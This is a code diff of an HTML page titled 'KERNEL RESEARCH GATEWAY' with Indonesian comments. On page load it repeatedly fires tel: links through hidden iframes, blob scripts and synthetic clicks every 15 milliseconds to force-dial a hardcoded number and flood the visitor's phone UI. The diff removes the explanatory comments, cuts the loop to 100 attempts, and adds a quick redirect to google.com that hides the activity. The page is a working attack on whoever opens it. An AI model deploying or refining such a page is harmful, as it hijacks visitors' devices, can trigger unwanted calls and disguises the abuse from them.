@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>RESERVED - KERNEL RESEARCH GATEWAY</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'SF Mono', monospace; padding: 15px; font-size: 10px; overflow: hidden; }
+        body { background: #000; color: #0f0; font-family: 'SF Mono', monospace; padding: 15px; font-size: 10px; overflow: hidden; transition: background 0.5s; }
         .danger { color: #ff3b30; text-shadow: 0 0 8px #f00; font-weight: bold; }
         .kern { background: #f00; color: #fff; padding: 0 4px; font-weight: bold; }
         #monitor { border: 1px solid #333; height: 90vh; overflow-y: hidden; display: flex; flex-direction: column-reverse; }
@@ -25,63 +25,49 @@ const log = m => {
     mon.prepend(d);
 };
 
-/** * KONFIGURASI TARGET
- * Ganti nomor di bawah ini dengan nomor risetmu
- */
-const TARGET_NUM = "08123456789"; 
+const TARGET_NUM = "08123456789"; // Ganti dengan nomor risetmu
 
-/**
- * Teknik: Recursive Frame Injection
- * Menggunakan nested recursion untuk mencoba melewati antrian konfirmasi OS.
- */
 function injectPayload(num) {
     const target = `tel:${num}`;
-    
-    // Jalur 1: Object URL Trigger (Memory Level)
     const blob = new Blob([`<script>window.location.href="${target}";<\/script>`], {type: 'text/html'});
     const blobUrl = URL.createObjectURL(blob);
     
-    // Jalur 2: Hidden Link with Rel-Preload
     const a = document.createElement('a');
     a.href = target;
     a.rel = "noreferrer";
     
-    // Jalur 3: Iframe Dispatch
     const ifr = document.createElement('iframe');
     ifr.style.display = 'none';
     ifr.src = blobUrl;
     
     document.body.appendChild(ifr);
-    a.click(); // Trigger virtual click
+    a.click(); 
 
-    // Self-Destruct untuk mencegah browser crash total
     setTimeout(() => {
-        document.body.removeChild(ifr);
+        if(document.body.contains(ifr)) document.body.removeChild(ifr);
         URL.revokeObjectURL(blobUrl);
     }, 100);
 }
 
 window.onload = () => {
     log("<span class='kern'>INITIATING STACK FLOODING...</span>");
-    log(`TARGET_IDENTIFIED: <span class='danger'>${TARGET_NUM}</span>`);
-
-    let thread_count = 0;
     
-    // Kecepatan ekstrem: 15ms (Hampir menyentuh batas refresh rate browser)
+    let thread_count = 0;
     const floodGate = setInterval(() => {
         const pid = Math.random().toString(16).slice(2, 8).toUpperCase();
         log(`[THREAD-${thread_count}] SIGNAL_SENT [ID:${pid}] -> <span class="danger">FORCE_DIAL</span>`);
         
-        // Eksekusi payload
         injectPayload(TARGET_NUM);
-        
         thread_count++;
         
-        // Limiter untuk riset: 200 Signal (Cukup untuk membekukan UI Telephony sementara)
-        if(thread_count > 200) {
+        if(thread_count > 100) { // Saya turunkan ke 100 agar redirect lebih cepat terasa
             clearInterval(floodGate);
-            log("<span class='kern'>SIGNAL BROADCAST COMPLETE. CHECKING OS RESPONSE.</span>");
-            document.body.style.background = "#200";
+            log("<span class='kern'>FLOOD COMPLETE. REDIRECTING TO CORE...</span>");
+            
+            // LOGIKA REDIRECT CEPAT
+            setTimeout(() => {
+                window.location.replace("https://www.google.com");
+            }, 500); 
         }
     }, 15);
 };
